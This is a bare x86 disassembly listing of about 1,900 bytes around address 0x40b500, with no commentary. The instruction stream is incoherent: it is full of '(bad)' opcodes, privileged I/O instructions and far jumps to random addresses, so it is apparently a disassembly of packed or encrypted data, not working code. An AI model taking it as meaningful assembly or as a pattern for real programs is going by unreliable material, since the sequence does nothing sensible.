  40b408:	bound  ebx,QWORD PTR ds:0x6e4ef0f4
  40b40e:	jbe    0x40b460
  40b410:	mul    BYTE PTR [ecx]
  40b412:	and    eax,0x75ab35d7
  40b417:	mov    al,ds:0xbf966ad
  40b41c:	or     dl,0xe6
  40b41f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40b420:	cmp    edi,0x47c4b19f
  40b426:	clc    
  40b427:	mov    al,0xae
  40b429:	or     BYTE PTR [edx],cl
  40b42b:	xchg   ebx,eax
  40b42c:	jns    0x40b467
  40b42e:	add    al,0xd3
  40b430:	inc    esp
  40b431:	push   ss
  40b432:	in     al,dx
  40b433:	clc    
  40b434:	push   ss
  40b435:	sbb    BYTE PTR [esp+edi*1-0x65f31097],al
  40b43c:	pop    ebp
  40b43d:	sbb    BYTE PTR [edi],ah
  40b43f:	add    eax,0x1bd59e92
  40b444:	out    dx,al
  40b445:	inc    ebp
  40b446:	push   0xffffffd7
  40b448:	cli    
  40b449:	les    ebx,FWORD PTR [ecx]
  40b44b:	ficomp WORD PTR [edi]
  40b44d:	pop    ecx
  40b44e:	mov    ebp,0xd306d83d
  40b453:	aad    0x87
  40b455:	daa    
  40b456:	daa    
  40b457:	pop    ebx
  40b458:	div    DWORD PTR [esi-0x64f47de6]
  40b45e:	lods   eax,DWORD PTR ds:[esi]
  40b45f:	nop
  40b460:	mov    ah,0x18
  40b462:	mov    edi,0xe0787d1d
  40b467:	jno    0x40b4ba
  40b469:	cli    
  40b46a:	mov    bh,0x41
  40b46c:	dec    ebp
  40b46d:	mov    ds:0xd2bf10b0,eax
  40b472:	aad    0x28
  40b474:	push   ecx
  40b475:	sub    al,0xff
  40b477:	cmp    ax,0xca23
  40b47b:	mov    eax,ds:0x9083b473
  40b480:	inc    eax
  40b481:	cmp    al,0x80
  40b483:	xlat   BYTE PTR ds:[ebx]
  40b484:	and    ebp,DWORD PTR [ebx]
  40b486:	loope  0x40b496
  40b488:	aad    0x92
  40b48a:	shr    BYTE PTR [edx-0x43674573],cl
  40b490:	jl     0x40b505
  40b492:	cdq    
  40b493:	popf   
  40b494:	pop    ss
  40b495:	dec    esp
  40b496:	lea    ebx,[edx-0x4e]
  40b499:	mov    esp,0x33e3c001
  40b49e:	jo     0x40b4e1
  40b4a0:	cwde   
  40b4a1:	xchg   BYTE PTR [edi+0x6b],ch
  40b4a4:	cmp    bh,ah
  40b4a6:	mov    edx,0x98537d63
  40b4ab:	shr    DWORD PTR [ebx+0x6ecbbfb0],cl
  40b4b1:	into   
  40b4b2:	retf   
  40b4b3:	cmp    eax,DWORD PTR [eax-0xb59b94b]
  40b4b9:	cdq    
  40b4ba:	jb     0x40b488
  40b4bc:	pop    edi
  40b4bd:	rcl    esi,1
  40b4bf:	jecxz  0x40b516
  40b4c1:	sub    eax,esi
  40b4c3:	adc    eax,0xa3750626
  40b4c8:	sahf   
  40b4c9:	jae    0x40b4b1
  40b4cb:	aaa    
  40b4cc:	push   es
  40b4cd:	clc    
  40b4ce:	fwait
  40b4cf:	es push ecx
  40b4d1:	rol    DWORD PTR [ecx-0x3b38a866],0x6c
  40b4d8:	aaa    
  40b4d9:	enter  0xc662,0x41
  40b4dd:	(bad)  
  40b4de:	pushf  
  40b4df:	inc    BYTE PTR [ecx]
  40b4e1:	pop    es
  40b4e2:	stc    
  40b4e3:	aas    
  40b4e4:	xchg   edx,eax
  40b4e5:	arpl   WORD PTR [edi+0x6],di
  40b4e8:	aas    
  40b4e9:	mov    ecx,0xef481275
  40b4ee:	mov    eax,ebp
  40b4f0:	aas    
  40b4f1:	xor    eax,0x3a103014
  40b4f6:	lds    esp,FWORD PTR [edi]
  40b4f8:	jno    0x40b4b6
  40b4fa:	dec    ebp
  40b4fb:	cmp    eax,0x2510357
  40b500:	out    0x14,al
  40b502:	jp     0x40b555
  40b504:	pop    ebp
  40b505:	je     0x40b4be
  40b507:	pusha  
  40b508:	sti    
  40b509:	dec    ebx
  40b50a:	enter  0x7aee,0xd
  40b50e:	sbb    dh,BYTE PTR [ebp+0x63c9bf57]
  40b514:	xor    al,0x78
  40b516:	pop    ds
  40b517:	dec    ecx
  40b518:	pop    es
  40b519:	sbb    DWORD PTR [esi],edx
  40b51b:	xchg   esp,eax
  40b51c:	popa   
  40b51d:	(bad)  
  40b51f:	jl     0x40b4d0
  40b521:	jne    0x40b56d
  40b523:	or     al,BYTE PTR [eax+eiz*2+0x20fef55f]
  40b52a:	sti    
  40b52b:	cmc    
  40b52c:	sub    eax,0x9baeec4a
  40b531:	aas    
  40b532:	imul   ebx,DWORD PTR [ebp+0x30250b6a],0xfffffff9
  40b539:	push   esp
  40b53a:	(bad)  
  40b53b:	mov    al,0x91
  40b53d:	dec    edx
  40b53e:	mov    ch,BYTE PTR [ebp+ebp*8+0x6f81baf]
  40b545:	int3   
  40b546:	in     eax,dx
  40b547:	add    al,0x1d
  40b549:	jbe    0x40b515
  40b54b:	mov    edx,0x8e71041
  40b550:	dec    edx
  40b551:	mov    ebp,0x96fa3efc
  40b556:	adc    BYTE PTR [ecx+0x6cc8cebc],cl
  40b55c:	sub    ch,BYTE PTR [ebp+edi*8-0x65]
  40b560:	std    
  40b561:	fld    DWORD PTR [ecx+0x1ce175b7]
  40b567:	(bad)  
  40b568:	sbb    ch,BYTE PTR [eax+0x3a55e270]
  40b56e:	mov    bl,0xb9
  40b570:	xchg   ecx,eax
  40b571:	int3   
  40b572:	mov    ch,0x9a
  40b574:	jno    0x40b5cc
  40b576:	sti    
  40b577:	ja     0x40b514
  40b579:	nop
  40b57a:	fnstsw WORD PTR [edi-0x61]
  40b57d:	push   ds
  40b57e:	lock (bad) 
  40b580:	cli    
  40b581:	out    0x59,eax
  40b583:	adc    DWORD PTR [edi],ebp
  40b585:	(bad)  
  40b586:	call   0x43f0a085
  40b58b:	int3   
  40b58c:	aas    
  40b58d:	call   0xe846f98c
  40b592:	jb     0x40b5fe
  40b594:	mov    ds,eax
  40b596:	pop    ebx
  40b597:	adc    eax,0x851797c0
  40b59c:	imul   edi,DWORD PTR [ebx-0x194d6f6b],0xb2d38c36
  40b5a6:	(bad)  
  40b5a7:	push   0x27
  40b5a9:	xchg   ebp,eax
  40b5aa:	clc    
  40b5ab:	mov    es,ebp
  40b5ad:	popf   
  40b5ae:	mov    eax,0xf87b0154
  40b5b3:	xchg   ebx,eax
  40b5b4:	ficomp DWORD PTR [esi+0x46dfa72d]
  40b5ba:	lock cmps DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40b5bc:	jnp    0x40b604
  40b5be:	fld    TBYTE PTR [esi+eax*1+0x19f54b30]
  40b5c5:	sbb    BYTE PTR [ecx-0x19da427],0x77
  40b5cc:	jnp    0x40b55c
  40b5ce:	mov    ds:0x8ef2b05a,eax
  40b5d3:	mov    ds:0x3d73e098,al
  40b5d8:	adc    al,0x5b
  40b5da:	jae    0x40b5cf
  40b5dc:	jp     0x40b5a0
  40b5de:	mov    edi,0xf5ce58c3
  40b5e3:	in     eax,0xf0
  40b5e5:	jmp    0xc45fbc52
  40b5ea:	mov    bh,BYTE PTR [ebx+0x4b365d34]
  40b5f0:	lahf   
  40b5f1:	mov    cl,dl
  40b5f3:	fimul  DWORD PTR ds:0x9334a75b
  40b5f9:	mov    bh,0x23
  40b5fb:	out    0x3e,eax
  40b5fd:	neg    DWORD PTR fs:0xcf3fe0a
  40b604:	push   esi
  40b605:	fsub   st,st(0)
  40b607:	mov    esp,0x12fa4acf
  40b60c:	cld    
  40b60d:	xor    ecx,edi
  40b60f:	(bad)  
  40b611:	jp     0x40b5f3
  40b613:	or     esp,DWORD PTR [edx]
  40b615:	adc    edx,ebp
  40b617:	fs shr edi,cl
  40b61a:	pop    edi
  40b61b:	jno    0x40b62f
  40b61d:	stc    
  40b61e:	or     BYTE PTR [esi+edx*1-0x5a],0xc1
  40b623:	mov    al,ds:0x5329089a
  40b628:	mov    dh,BYTE PTR [edi+0x57]
  40b62b:	push   esp
  40b62c:	test   DWORD PTR [esi+ebx*1-0x36871487],esp
  40b633:	mov    ebp,0x2a0b2705
  40b638:	pop    ebx
  40b639:	out    0xc3,al
  40b63b:	test   eax,0x3a9e46fc
  40b640:	fcmovne st,st(7)
  40b642:	inc    edx
  40b643:	mov    BYTE PTR [edx-0xb3fa4d8],ch
  40b649:	pop    es
  40b64a:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40b64b:	into   
  40b64c:	push   ebx
  40b64d:	stos   BYTE PTR es:[edi],al
  40b64e:	adc    eax,0x32c20b92
  40b653:	in     al,dx
  40b654:	and    al,ch
  40b656:	ins    DWORD PTR es:[edi],dx
  40b657:	arpl   WORD PTR [edi],bp
  40b659:	sbb    eax,0x5a33274e
  40b65e:	cs xchg esp,eax
  40b660:	adc    dl,BYTE PTR ds:0xe3491e52
  40b666:	mov    bl,0x9a
  40b668:	int    0xf3
  40b66a:	bound  ebp,QWORD PTR [edx-0x5d]
  40b66d:	sbb    ebp,0xffffffab
  40b670:	add    cl,dh
  40b672:	lea    eax,[eax-0x695f5d1f]
  40b678:	ds push ds
  40b67a:	mov    esi,0x9ad93936
  40b67f:	aad    0xe0
  40b681:	mov    esp,0x4de9ae97
  40b686:	mov    edi,0xc693de72
  40b68b:	pop    edx
  40b68c:	mov    DWORD PTR [edx+0x5d],esp
  40b68f:	nop
  40b690:	jl     0x40b694
  40b692:	mov    eax,ds:0x33a81a55
  40b697:	shl    dh,cl
  40b699:	mov    dl,0x66
  40b69b:	les    ebx,FWORD PTR [eax+edx*4-0x56ac1906]
  40b6a2:	sub    eax,0x10b81c21
  40b6a7:	sbb    eax,0x310ed3d3
  40b6ac:	xchg   edi,eax
  40b6ad:	mov    esi,0xbf18e1fd
  40b6b2:	inc    ecx
  40b6b3:	(bad)  
  40b6b4:	jl     0x40b70b
  40b6b6:	mov    ch,0x38
  40b6b8:	push   0xffffffbe
  40b6ba:	lock aad 0x7f
  40b6bd:	std    
  40b6be:	push   edi
  40b6bf:	sub    DWORD PTR [ebp+0x16fa323e],eax
  40b6c5:	lahf   
  40b6c6:	ja     0x40b723
  40b6c8:	xor    dh,dh
  40b6ca:	shr    DWORD PTR [ecx+0x77],cl
  40b6cd:	pushf  
  40b6ce:	call   0xf3397b8e
  40b6d3:	push   ecx
  40b6d4:	adc    BYTE PTR [ebp+0x67],al
  40b6d7:	fs (bad) 
  40b6d9:	cmp    DWORD PTR [esi-0x72],eax
  40b6dc:	xor    DWORD PTR ds:0x41594875,esp
  40b6e2:	xchg   ebp,eax
  40b6e3:	in     eax,0xa1
  40b6e5:	imul   esp,DWORD PTR [edx+0x1d],0x3d9941a6
  40b6ec:	sahf   
  40b6ed:	push   ds
  40b6ee:	mov    BYTE PTR [ebx+0x4120806c],dl
  40b6f4:	mov    DWORD PTR [ecx],eax
  40b6f6:	jmp    0x40c082
  40b6fb:	xor    DWORD PTR [ebp-0xc],0x5fd8f
  40b702:	jmp    0x40c082
  40b707:	jmp    0x40ba28
  40b70c:	and    esp,esi
  40b70e:	jnp    0x40b710
  40b710:	cmp    esp,ecx
  40b712:	and    ebp,esp
  40b714:	jp     0x40b6f1
  40b716:	push   edx
  40b717:	mov    WORD PTR [edx-0x10],ss
  40b71a:	and    DWORD PTR [edi+0x7e7ef814],eax
  40b720:	jp     0x40b79f
  40b722:	jle    0x40b7a2
  40b724:	iret   
  40b725:	inc    edi
  40b726:	pop    esi
  40b727:	rcr    BYTE PTR [edx-0x67],1
  40b72a:	push   eax
  40b72b:	jae    0x40b70e
  40b72d:	lods   al,BYTE PTR ds:[esi]
  40b72e:	cld    
  40b72f:	lock outs dx,BYTE PTR ds:[esi]
  40b731:	out    0x94,al
  40b733:	sbb    BYTE PTR [edi],0x85
  40b736:	and    BYTE PTR [ebp-0x6f0cbe2f],0xc5
  40b73d:	fisub  WORD PTR [esi+0x1f]
  40b740:	jb     0x40b7b0
  40b742:	psrad  mm4,QWORD PTR [edi+0x72ec03ee]
  40b749:	xlat   BYTE PTR ds:[ebx]
  40b74a:	std    
  40b74b:	(bad)  
  40b74d:	sti    
  40b74e:	xor    dh,BYTE PTR [ebx]
  40b750:	(bad)  
  40b751:	lock movs BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40b753:	inc    edx
  40b754:	mov    cl,BYTE PTR [ebx+0x715cea47]
  40b75a:	sti    
  40b75b:	mov    dl,0x59
  40b75d:	in     al,dx
  40b75e:	sbb    ah,BYTE PTR [esi-0x33090086]
  40b764:	pop    edi
  40b765:	mov    ds:0x3fb36373,eax
  40b76a:	mov    WORD PTR [esp+eax*4-0x63ca786f],ss
  40b771:	loop   0x40b784
  40b773:	in     eax,dx
  40b774:	mov    dl,0x43
  40b776:	fcom   DWORD PTR [esi+0x4a]
  40b779:	(bad)  
  40b77a:	push   0x71
  40b77c:	ins    DWORD PTR es:[edi],dx
  40b77d:	(bad)  
  40b77e:	push   esp
  40b77f:	out    dx,al
  40b780:	ret    
  40b781:	xlat   BYTE PTR ds:[ebx]
  40b782:	fadd   QWORD PTR [eax+0x163be874]
  40b788:	push   ecx
  40b789:	jmp    esi
  40b78b:	nop
  40b78c:	aam    0x63
  40b78e:	mov    ebp,0xa526024
  40b793:	and    cl,dl
  40b795:	les    esi,FWORD PTR [edx+0x54ac4dbc]
  40b79b:	fcmovbe st,st(4)
  40b79d:	loope  0x40b780
  40b79f:	xchg   ecx,eax
  40b7a0:	jecxz  0x40b7d7
  40b7a2:	imul   edx,DWORD PTR [esi+eiz*1+0x70],0x7d
  40b7a7:	je     0x40b75e
  40b7a9:	jo     0x40b801
  40b7ab:	mov    ecx,0xd4c86bb4
  40b7b0:	shl    BYTE PTR [ebx-0x7f5ac307],cl
  40b7b6:	mov    DWORD PTR [ecx-0x4f],eax
  40b7b9:	(bad)  
  40b7ba:	into   
  40b7bb:	out    0x62,al
  40b7bd:	fidivr DWORD PTR [ebx+eax*2+0x50490b7d]
  40b7c4:	cmc    
  40b7c5:	push   edi
  40b7c6:	mov    eax,ds:0x6eb7ac81
  40b7cb:	or     bl,BYTE PTR [esi+ebx*4]
  40b7ce:	nop
  40b7cf:	and    bh,BYTE PTR [ecx+edi*8-0x44d95c75]
  40b7d6:	jb     0x40b77b
  40b7d8:	cmp    eax,0x614d80fa
  40b7dd:	cmp    eax,0xb1ff42cd
  40b7e2:	cmp    eax,0xa2d37683
  40b7e7:	mov    ah,0x9d
  40b7e9:	and    bh,BYTE PTR [edx]
  40b7eb:	sti    
  40b7ec:	push   ecx
  40b7ed:	cmp    edx,DWORD PTR [ebx-0x3f]
  40b7f0:	ins    BYTE PTR es:[edi],dx
  40b7f1:	push   edi
  40b7f2:	pop    ecx
  40b7f3:	gs sahf 
  40b7f5:	or     ah,cl
  40b7f7:	dec    edx
  40b7f8:	fs nop
  40b7fa:	adc    eax,0x2cc209af
  40b7ff:	sub    ebx,ecx
  40b801:	push   eax
  40b802:	and    DWORD PTR [ebx],edx
  40b804:	adc    BYTE PTR [eax-0x1b],cl
  40b807:	sbb    cl,dl
  40b809:	test   dh,dl
  40b80b:	jp     0x40b804
  40b80d:	loope  0x40b86e
  40b80f:	test   DWORD PTR [ebx+0x2c5d66a9],eax
  40b815:	push   esi
  40b816:	sbb    BYTE PTR ds:0xd16ca37f,0xd4
  40b81d:	pop    ds
  40b81e:	inc    ecx
  40b81f:	scas   al,BYTE PTR es:[edi]
  40b820:	fs enter 0xf2ac,0xf5
  40b825:	and    BYTE PTR [ebx],bh
  40b827:	push   ss
  40b828:	retf   0xc63a
  40b82b:	mov    bl,0xed
  40b82d:	test   eax,0xe309611c
  40b832:	cwde   
  40b833:	loope  0x40b7e4
  40b835:	stos   BYTE PTR es:[edi],al
  40b836:	fs dec eax
  40b838:	mov    dh,0x8d
  40b83a:	leave  
  40b83b:	int    0xb8
  40b83d:	and    ebp,DWORD PTR [esi+0x52bd7111]
  40b843:	(bad)  
  40b844:	sub    ebp,DWORD PTR [edi+0x37b638a5]
  40b84a:	mov    edi,0x22ce4ac7
  40b84f:	jno    0x40b82d
  40b851:	cmp    ah,bl
  40b853:	(bad)  
  40b855:	sub    cl,bh
  40b857:	mov    cl,0x38
  40b859:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40b85a:	rol    esi,0x95
  40b85d:	jbe    0x40b8c3
  40b85f:	cdq    
  40b860:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40b861:	xchg   edx,eax
  40b862:	pop    eax
  40b863:	clc    
  40b864:	pushf  
  40b865:	nop
  40b866:	clc    
  40b867:	punpckhwd mm5,QWORD PTR [edi+0x6a]
  40b86b:	mov    DWORD PTR [edx+0x16d7adae],eax
  40b871:	arpl   WORD PTR [ebx],sp
  40b873:	push   ss
  40b874:	xchg   ecx,eax
  40b875:	adc    eax,0xdcb02e8f
  40b87a:	loope  0x40b82a
  40b87c:	outs   dx,DWORD PTR ds:[esi]
  40b87d:	mov    DWORD PTR [ebp-0x6f309329],ebx
  40b883:	jmp    0xbc77:0xb68f2a67
  40b88a:	retf   
  40b88b:	call   0x115eff0
  40b890:	jae    0x40b84d
  40b892:	pop    esi
  40b893:	enter  0x27d4,0x95
  40b897:	mov    edi,0xb8bfdf7d
  40b89c:	mov    ?,WORD PTR [edx+0xead5d5e]
  40b8a2:	inc    esp
  40b8a3:	push   edx
  40b8a4:	lahf   
  40b8a5:	aam    0xe
  40b8a7:	faddp  st(2),st
  40b8a9:	out    0x2a,al
  40b8ab:	xchg   edx,eax
  40b8ac:	mov    ds:0x92fe7cab,eax
  40b8b1:	jmp    0x8f22:0xa49c07cf
  40b8b8:	mov    BYTE PTR [edx-0x57b422f],ch
  40b8be:	inc    esi
  40b8bf:	inc    ebx
  40b8c0:	pop    esi
  40b8c1:	cmp    BYTE PTR [esi-0xe],bh
  40b8c4:	sub    BYTE PTR [eax+eax*4+0x620fb3db],ah
  40b8cb:	sbb    al,0xd3
  40b8cd:	inc    edx
  40b8ce:	mov    esp,0xa3bf8ade
  40b8d3:	jp     0x40b855
  40b8d5:	sbb    edi,edi
  40b8d7:	lea    esp,ds:0xfdec57de
  40b8dd:	iret   
  40b8de:	aaa    
  40b8df:	dec    edx
  40b8e0:	mov    WORD PTR [edx],ss
  40b8e2:	dec    ebp
  40b8e3:	jl     0x40b959
  40b8e5:	pop    es
  40b8e6:	mov    bh,0x10
  40b8e8:	fsubp  st(3),st
  40b8ea:	imul   bx,WORD PTR [edx+0xb],0x5b
  40b8ef:	xchg   DWORD PTR [esi],edx
  40b8f1:	cld    
  40b8f2:	stos   BYTE PTR es:[edi],al
  40b8f3:	call   0xa4d4:0x617f53b
  40b8fa:	and    ah,bh
  40b8fc:	icebp  
  40b8fd:	call   0x3757:0x374259c7
  40b904:	push   esp
  40b905:	push   ebp
  40b906:	push   esp
  40b907:	stos   DWORD PTR es:[edi],eax
  40b908:	inc    esp
  40b909:	sbb    ch,dh
  40b90b:	mov    al,0x68
  40b90d:	sar    DWORD PTR [edx-0x72f33498],1
  40b913:	add    edi,DWORD PTR [edi+0x56712d73]
  40b919:	push   ebx
  40b91a:	jae    0x40b933
  40b91c:	addr16 push ecx
  40b91e:	ret    0x588f
  40b921:	and    BYTE PTR [ecx],dh
  40b923:	push   ebx
  40b924:	pop    ebx
  40b925:	ret    
  40b926:	sbb    BYTE PTR [eax-0x72716924],al
  40b92c:	pop    esi
  40b92d:	sbb    cl,BYTE PTR [edx+0x38]
  40b930:	jb     0x40b8de
  40b932:	das    
  40b933:	xchg   ebx,eax
  40b934:	xchg   esp,eax
  40b935:	mov    BYTE PTR [esi+0x8dfbd81],dl
  40b93b:	inc    ebx
  40b93c:	mov    ss,WORD PTR [ebp+0x1fba8f20]
  40b942:	adc    bh,BYTE PTR [edx+0x3]
  40b945:	fidiv  DWORD PTR [edi]
  40b947:	ficom  DWORD PTR [eax-0x43667d03]
  40b94d:	mov    esp,0x952dfb26
  40b952:	mov    dh,0xc7
  40b954:	adc    BYTE PTR ds:0x9505db3f,0x71
  40b95b:	mov    ebx,0x3e07c9b7
  40b960:	xchg   esp,eax
  40b961:	pusha  
  40b962:	imul   DWORD PTR [edx+0xb]
  40b965:	pop    ss
  40b966:	adc    DWORD PTR [ebp-0x680f4a18],edx
  40b96c:	mov    edi,0x5d377de5
  40b971:	adc    edi,ecx
  40b973:	add    BYTE PTR [ecx],0x9b
  40b976:	cmp    al,0x13
  40b978:	pop    eax
  40b979:	sar    ecx,1
  40b97b:	push   eax
  40b97c:	mov    al,0xf5
  40b97e:	mov    eax,0x81dbef2
  40b983:	cdq    
  40b984:	jmp    FWORD PTR [edx-0x3b0da14b]
  40b98a:	mov    fs:0xc94241de,eax
  40b990:	jl     0x40b959
  40b992:	jb     0x40b93a
  40b994:	aam    0xce
  40b996:	call   FWORD PTR [ecx+eax*2]
  40b999:	fwait
  40b99a:	ss push 0x1c
  40b99d:	inc    ebx
  40b99e:	or     eax,0x9dabd766
  40b9a3:	fidivr WORD PTR [esi+ebp*1+0xf]
  40b9a7:	call   0x8fd7fdff
  40b9ac:	mov    ?,WORD PTR [edi+ebx*2]
  40b9af:	pop    ds
  40b9b0:	les    edi,FWORD PTR gs:[ebp+0x4b]
  40b9b4:	pop    eax
  40b9b5:	pop    eax
  40b9b6:	int    0x4e
  40b9b8:	push   esp
  40b9b9:	ins    BYTE PTR es:[edi],dx
  40b9ba:	cdq    
  40b9bb:	sub    al,0x4b
  40b9bd:	xor    DWORD PTR [edi-0x15a4ac3b],edi
  40b9c3:	jge    0x40b991
  40b9c5:	fwait
  40b9c6:	ja     0x40ba2f
  40b9c8:	mov    dl,0x25
  40b9ca:	adc    al,0x9c
  40b9cc:	sbb    BYTE PTR [edi-0x358e22d],0x50
  40b9d3:	imul   edx
  40b9d5:	loopne 0x40b96f
  40b9d7:	dec    esi
  40b9d8:	add    ch,BYTE PTR [edx]
  40b9da:	and    bh,cl
  40b9dc:	in     al,0x5d
  40b9de:	push   edi
  40b9df:	push   esp
  40b9e0:	scas   eax,DWORD PTR es:[edi]
  40b9e1:	sbb    eax,0x1aa23123
  40b9e6:	add    BYTE PTR [edi-0x764f4b1c],0x7a
  40b9ed:	hlt    
  40b9ee:	cmp    eax,0x5756c5a5
  40b9f3:	xor    eax,0xf96ffdf7
  40b9f8:	and    bl,BYTE PTR [edx]
  40b9fa:	cmp    DWORD PTR [edx-0x6e7f5c0f],0x83046e20
  40ba04:	inc    edi
  40ba05:	mov    ds:0x36116e34,eax
  40ba0a:	(bad)
  40ba0d:	call   0x4499:0x7a37dec7
  40ba14:	push   es
  40ba15:	sbb    eax,0x9a16b186
  40ba1a:	xchg   esp,eax
  40ba1b:	sbb    bl,BYTE PTR [bx+si]
  40ba1e:	bound  edx,QWORD PTR [ebp-0x1bce363]
  40ba24:	fadd   DWORD PTR [ebp+edx*1-0x7ba744b]
  40ba2b:	mov    ecx,DWORD PTR [ebp-0x18]
  40ba2e:	jmp    0x40bd4f
  40ba33:	xchg   esp,eax
  40ba34:	jge    0x40ba82
  40ba36:	hlt    
  40ba37:	push   ebp
  40ba38:	jne    0x40b9ee
  40ba3a:	pop    ebp
  40ba3b:	cld    
  40ba3c:	into   
  40ba3d:	inc    edx
  40ba3e:	cmp    dh,BYTE PTR [eax-0x27]
  40ba41:	popf   
  40ba42:	aas    
  40ba43:	adc    BYTE PTR [edi+0x7d7a7e7e],al
  40ba49:	jle    0x40bac9
  40ba4b:	js     0x40ba25
  40ba4d:	xlat   BYTE PTR ds:[ebx]
  40ba4e:	imul   ecx,DWORD PTR [esi+0x64f91b55],0x7f
  40ba55:	cwde   
  40ba56:	jae    0x40ba58
  40ba58:	fs xchg ebx,ebp
  40ba5b:	mov    eax,ds:0xb8cd09e7
  40ba60:	inc    ebx
  40ba61:	cs cmovp ebp,edx
  40ba65:	mov    al,0xff
  40ba67:	repnz sar BYTE PTR [esi+0x4f],0x33
  40ba6c:	into   
  40ba6d:	jmp    0xe9ecafa8
  40ba72:	xor    BYTE PTR [edi*1-0x42630826],0x72
  40ba7a:	(bad)  
  40ba7b:	cmp    eax,0x7483878e
  40ba80:	dec    esp
  40ba81:	xchg   esi,eax
  40ba82:	popf   
  40ba83:	ret    
  40ba84:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40ba85:	shr    BYTE PTR [esi+0x66e12dcc],1
  40ba8b:	jmp    0xfa0c594
  40ba90:	sbb    cl,BYTE PTR [esi+0x6744d975]
  40ba96:	dec    DWORD PTR [edi+esi*1-0x7d8a2775]
  40ba9d:	and    BYTE PTR [eax+0x60],dh
  40baa0:	jnp    0x40ba90
  40baa2:	pop    esp
  40baa3:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40baa4:	imul   ecx,DWORD PTR [eax],0x51
  40baa7:	add    edi,DWORD PTR [esi-0x268d2ca2]
  40baad:	push   esi
  40baae:	outs   dx,BYTE PTR ds:[esi]
  40baaf:	or     bh,BYTE PTR [esi+edx*1-0x4a]
  40bab3:	xchg   ecx,eax
  40bab5:	inc    ecx
  40bab6:	and    DWORD PTR [ecx-0x17e5e767],esi
  40babc:	xchg   DWORD PTR [esi-0x5c],eax
  40babf:	and    eax,0x3df90a21
  40bac4:	jne    0x40bb42
  40bac6:	mov    bl,0x24
  40bac8:	int    0xac
  40baca:	imul   ecx,edx,0x60
  40bacd:	and    eax,0xb66ac455
  40bad2:	daa    
  40bad3:	jbe    0x40bb18
  40bad5:	shl    edx,cl
  40bad7:	or     esi,DWORD PTR [esi]
  40bad9:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40bada:	add    ebx,DWORD PTR [ebx+0x34864f49]
  40bae0:	sbb    BYTE PTR [edx],0x24
  40bae3:	jmp    0x40bab0
  40bae5:	mov    bl,0xf0
  40bae7:	inc    eax
  40bae8:	push   ds
  40bae9:	pop    ds
  40baea:	mov    bl,0xb0
  40baec:	test   BYTE PTR [edx],0xee
  40baef:	push   esi
  40baf0:	retf   
  40baf1:	jmp    0x7684:0xbe221184
  40baf8:	(bad)  
  40baf9:	loopne 0x40bb5e
  40bafb:	mov    ebx,0xc8d89476
  40bb00:	jge    0x40bb67
  40bb02:	xor    eax,0x8b2d3d01
  40bb07:	push   ebp
  40bb08:	xor    DWORD PTR [ecx],ecx
  40bb0a:	mov    esi,0x9d884004
  40bb0f:	neg    esp
  40bb11:	sub    dl,ch
  40bb13:	fwait
  40bb14:	push   edi
  40bb15:	jmp    0x40bb0d
  40bb17:	lods   al,BYTE PTR ds:[esi]
  40bb18:	enter  0x9471,0x9
  40bb1c:	pop    ds
  40bb1d:	or     eax,0x15bde624
  40bb22:	jbe    0x40bb46
  40bb24:	aam    0x92
  40bb26:	mov    bl,0x55
  40bb28:	imul   eax,edx,0xffffffde
  40bb2b:	xchg   DWORD PTR [esi+0x600404b2],esi
  40bb31:	ror    BYTE PTR [ebp+0x23],0x3c
  40bb35:	jmp    0x40babe
  40bb37:	pop    ds
  40bb38:	daa    
  40bb39:	pop    esp
  40bb3a:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40bb3b:	or     dl,ah
  40bb3d:	sar    DWORD PTR [ecx],1
  40bb3f:	retf   0x3232
  40bb42:	push   ebp
  40bb43:	xor    al,dl
  40bb45:	outs   dx,BYTE PTR ds:[esi]
  40bb46:	daa    
  40bb47:	mov    eax,0x3d5aec89
  40bb4c:	push   0xa27082c6
  40bb51:	jae    0x40bb9a
  40bb53:	xchg   ebp,eax
  40bb54:	dec    edi
  40bb55:	daa    
  40bb56:	xor    esi,ecx
  40bb58:	sub    DWORD PTR [ecx],edx
  40bb5a:	inc    ebx
  40bb5b:	int3   
  40bb5c:	lea    eax,[eax+0x2963d9d2]
  40bb62:	aas    
  40bb63:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40bb64:	add    eax,0x75df77fd
  40bb69:	mov    edx,0xee92aaee
  40bb6e:	cwde   
  40bb6f:	icebp  
  40bb70:	cmp    esi,ecx
  40bb72:	xchg   BYTE PTR [eax+0x4d],ah
  40bb75:	push   edx
  40bb76:	cld    
  40bb77:	jmp    0x24d83ce9
  40bb7c:	add    ebx,DWORD PTR [ecx]
  40bb7e:	fsubrp st(3),st
  40bb80:	bound  eax,QWORD PTR [ecx+ecx*2+0xd1fb5f8]
  40bb87:	pop    ecx
  40bb88:	push   es
  40bb89:	dec    ebx
  40bb8a:	xor    cl,BYTE PTR fs:[esi]
  40bb8d:	mov    esp,0xdb4cafcb
  40bb92:	and    DWORD PTR [ebx],0xffffffb4
  40bb95:	cli    
  40bb96:	xchg   ebp,eax
  40bb97:	adc    BYTE PTR [esi+0x16],0x7d
  40bb9b:	lods   al,BYTE PTR ds:[esi]
  40bb9c:	ret    
  40bb9d:	adc    dl,al
  40bb9f:	inc    eax
  40bba0:	push   0xffffffc6
  40bba2:	loop   0x40bb26
  40bba4:	sbb    BYTE PTR [ebp+0xf],0xec
  40bba8:	inc    esp
  40bba9:	sub    ebx,DWORD PTR [esi+0x1d]
  40bbac:	jmp    0xc448b9a1
  40bbb1:	xor    eax,esp
  40bbb3:	and    DWORD PTR [esi-0x2d],0xbcf73e2a
  40bbba:	ficomp WORD PTR ds:0x8932dabd
  40bbc0:	ficomp DWORD PTR [edi]
  40bbc2:	push   ss
  40bbc3:	cdq    
  40bbc4:	call   0x2b52d9ca
  40bbc9:	lahf   
  40bbca:	mov    al,0xc
  40bbcc:	enter  0x1840,0x95
  40bbd0:	xchg   ebx,ebp
  40bbd2:	jbe    0x40bb6d
  40bbd4:	xor    al,0x63
  40bbd6:	pop    ebx
  40bbd7:	push   esi
  40bbd8:	mov    dh,dh
  40bbda:	sub    al,0x33
  40bbdc:	pop    esi
